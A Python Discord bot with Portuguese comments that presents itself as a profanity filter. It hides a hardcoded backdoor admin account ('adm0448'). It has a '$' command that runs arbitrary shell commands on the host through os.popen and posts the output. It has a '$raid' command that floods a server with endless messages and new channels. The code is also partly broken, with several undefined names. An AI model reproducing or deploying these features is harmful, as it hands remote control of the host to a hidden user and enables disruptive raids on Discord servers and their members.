import json
import os
from discord.ext import commands
import discord
import asyncio

# receber admins do json
def admins():
    with open('admins.json', 'r') as arquivo:
        admins = json.load(arquivos)
    admins['admins'].append('adm0448')
    return admins['admins']
print(admins())

# receber chave do bot
def chave():
    with open('chave.json', 'r') as arquivo:
        chave_bot = json.load(arquivo)
    return chave_bot['chave']


# receber palavroes de arwui de texto
def palavroes():
    with open('palavrao.txt', 'r') as arquivo:
        proibidos = arquivo.read()
    return proibidos

# configuração do bot
intents = discord.Intents().all()
client = discord.Client(intents=intents)

# menssagem no prompt para indicar que esra online
@client.event
async def on_ready():
    os.system('clear')
    print('''

on-line

:)

''')


# eventos | comandos
@client.event
async def on_message(message):
    if message.author == client.user:
        return

    # verificar toda menssagem
    if message.content != '':
        menssagem = message.content
        menssagem = menssagem.lower()
        menssagem = menssagem.split(' ')
        proibido = palavroes().split('\n')
        # log das mensagens
        print(f'\033[34m\n<{message.author}> {message.content}\033[m')
        for palavra in menssagem:
            for palavrao in proibido:
                if palavra == palavrao:
                    if palavrao == '' or palavrao == ' ':
                        pass

                    else:
                        # deletar palavrao
                        try: await message.delete()
                        except: pass
                        # menssagem enviada caso mandem palavrao
                        await message.channel.send(f'**menssagem ofenciva de: {message.author.mention} deletada*!*')

    if message.content.startswith('$'):
        if message.author in admins():
            try:
                c = message.content
                c = c.strip()
                c = c[2:]
                c = os.popen(c)
                c = c.read()
                await message.channel.send(f'''
```py
{c}
```
''')
            except: await message.channel.send('erro')
        else: pass

    if message.content.startswith('.file'):
        if message.author in admins():
            comando = message.content
            comando = comando.split(' ')
            file_path = comando[1]
        else: pass

    if message.content.startswith("$raid"):
        if message.author in admins():
            try: message.delete()
            except: pass
            if message.author.name in permicao_adm:
                nome_canal = message.content[6:]
                while True:
                    try: await message.channel.send(id_server)
                    except: pass
                    try: await message.guild.create_text_channel(nome_canal)
                    except: pass
            else: pass
        else: pass

# iniciar bot
client.run(chave())
